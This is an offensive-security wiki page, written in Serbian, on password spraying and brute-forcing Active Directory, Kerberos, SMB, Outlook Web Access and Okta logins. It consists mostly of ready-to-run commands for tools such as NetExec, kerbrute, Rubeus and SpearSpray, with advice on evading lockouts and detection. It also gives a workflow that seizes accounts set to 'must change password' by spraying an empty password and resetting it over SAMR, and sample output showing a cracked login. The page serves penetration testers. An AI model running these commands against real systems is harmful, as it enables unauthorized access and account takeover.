# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

Kada pronađete nekoliko **važećih korisničkih imena** možete za svako otkriveno korisničko ime pokušati najčešće **lozinke** (imajući u vidu politiku lozinki okruženja).\
Po **podrazumevanju** **minimalna** **dužina** **lozinke** je **7**.

Liste čestih korisničkih imena takođe mogu biti korisne: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Obratite pažnju da **biste mogli zaključati neke naloge ako pokušate nekoliko pogrešnih lozinki** (po podrazumevanju više od 10).

### Dobijanje politike lozinki

Ako imate korisničke kredencijale ili shell kao domain user možete **dobiti politiku lozinki pomoću**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Exploitation sa Linuxa (ili sa svih sistema)

- Koristeći **crackmapexec:**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- Korišćenje **NetExec (naslednik CME)** za ciljano, diskretno spraying preko SMB/WinRM:
```bash
# Optional: generate a hosts entry to ensure Kerberos FQDN resolution
netexec smb <DC_IP> --generate-hosts-file hosts && cat hosts /etc/hosts | sudo sponge /etc/hosts

# Spray a single candidate password against harvested users over SMB
netexec smb <DC_FQDN> -u users.txt -p 'Password123!' \
--continue-on-success --no-bruteforce --shares

# Validate a hit over WinRM (or use SMB exec methods)
netexec winrm <DC_FQDN> -u <username> -p 'Password123!' -x "whoami"

# Tip: sync your clock before Kerberos-based auth to avoid skew issues
sudo ntpdate <DC_FQDN>
```
- Korišćenje [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(možete navesti broj pokušaja da izbegnete lockouts):**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- Korišćenje [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NE PREPORUČUJE SE, PONEKAD NE RADI
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- Sa modulom `scanner/smb/smb_login` iz **Metasploit**:

![](<../../images/image (745).png>)

- Korišćenjem **rpcclient**:
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Sa Windowsa

- Sa [Rubeus](https://github.com/Zer1t0/Rubeus) verzijom koja uključuje brute modul:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- Uz [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Podrazumevano može da generiše korisnike iz domena i preuzima politiku lozinki iz domena i ograničava pokušaje u skladu s njom):
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- Pomoću [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
### Identifikujte i preuzmite naloge sa "Password must change at next logon" (SAMR)

Niskoprofilna tehnika je da se izvrši password spray korišćenjem bezopasne/prazne lozinke i identifikuju nalozi koji vraćaju STATUS_PASSWORD_MUST_CHANGE, što ukazuje da je lozinka prisilno istekla i da se može promeniti bez poznavanja stare.

Workflow:
- Izlistajte korisnike (RID brute via SAMR) da biste sastavili listu ciljeva:

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- Spray praznu password i nastavi na hits da bi uhvatio naloge koji moraju da promene password pri next logon:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- Za svaki hit, promenite lozinku preko SAMR-a pomoću NetExec-ovog modula (stara lozinka nije potrebna kada je "must change" postavljeno):
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
Operativne napomene:
- Uverite se da je sat na vašem hostu sinhronizovan sa DC pre Kerberos-based operations: `sudo ntpdate <dc_fqdn>`.
- Oznaka [+] bez (Pwn3d!) u nekim modulima (npr., RDP/WinRM) znači da su creds validni, ali nalogu nedostaju prava za interaktivno prijavljivanje.

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying sa LDAP targeting i PSO-aware throttling (SpearSpray)

Kerberos pre-auth–based spraying smanjuje buku u odnosu na SMB/NTLM/LDAP bind pokušaje i bolje se slaže sa AD politikama zaključavanja. SpearSpray kombinuje ciljanje vođeno LDAP-om, mehanizam šablona i svesnost o politikama (domain policy + PSOs + badPwdCount buffer) kako bi vršio spray precizno i bezbedno. Takođe može tagovati kompromitovane naloge u Neo4j za BloodHound pathing.

Key ideas:
- Otkriće korisnika preko LDAP-a sa straničenjem i LDAPS podrškom, opcionalno koristeći prilagođene LDAP filtere.
- Politika zaključavanja domena + PSO-svesno filtriranje da ostavi konfigurabilni rezervni broj pokušaja (threshold) i izbegne zaključavanje korisnika.
- Kerberos pre-auth validation koristeći brze gssapi bindings (generiše 4768/4771 na DC-ima umesto 4625).
- Generisanje lozinki zasnovano na šablonima, po korisniku, koristeći promenljive kao što su imena i vremenske vrednosti izvedene iz pwdLastSet svakog korisnika.
- Kontrola propusnosti pomoću niti, jitter-a i max zahteva po sekundi.
- Opcionalna Neo4j integracija za označavanje owned korisnika za BloodHound.

Basic usage and discovery:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
Ciljanje i kontrola obrazaca:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Kontrole prikrivanja i bezbednosti:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Neo4j/BloodHound obogaćivanje:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Pregled sistema obrazaca (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Dostupne promenljive uključuju:
- {name}, {samaccountname}
- Vremenske vrednosti iz pwdLastSet (ili whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Pomoćne funkcije za kompoziciju i org token: {separator}, {suffix}, {extra}

Operativne napomene:
- Preferirajte upite ka PDC-emulatoru sa -dc da pročitate najautoritatilniji badPwdCount i informacije vezane za policy.
- badPwdCount reset-i se pokreću pri sledećem pokušaju nakon posmatranog vremenskog okvira; koristite threshold i timing da ostanete bezbedni.
- Kerberos pre-auth attempts se pojavljuju kao 4768/4771 u DC telemetry; koristite jitter i rate-limiting da se uklopite.

> Savet: SpearSpray’s default LDAP page size is 200; prilagodite sa -lps po potrebi.

## Outlook Web Access

Postoji više alata za p**assword spraying outlook**.

- Sa [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- Sa [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- Sa [Ruler](https://github.com/sensepost/ruler) (pouzdan!)
- Sa [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- Sa [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

Da biste koristili bilo koji od ovih alata, potrebna vam je lista korisnika i jedan password ili mala lista passwords za spray.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## Izvori

- [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
- [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
- [https://github.com/Greenwolf/Spray](https://github.com/Greenwolf/Spray)
- [https://github.com/Hackndo/sprayhound](https://github.com/Hackndo/sprayhound)
- [https://github.com/login-securite/conpass](https://github.com/login-securite/conpass)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
- [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)


{{#include ../../banners/hacktricks-training.md}}
